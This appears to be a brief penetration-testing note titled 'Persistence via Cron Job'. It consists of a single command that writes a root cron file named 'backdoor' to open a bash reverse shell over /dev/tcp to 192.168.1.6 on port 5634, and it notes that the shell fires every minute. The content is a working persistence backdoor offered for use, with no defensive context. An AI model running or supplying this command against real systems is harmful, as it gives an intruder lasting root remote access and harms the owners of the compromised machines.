**Persistence via Cron Job**

Command:
echo "* * * * * root /bin/bash -i >& /dev/tcp/192.168.1.6/5634 0>&1" > /etc/cron.d/backdoor

Outcome:
- Reverse shell triggered every minute
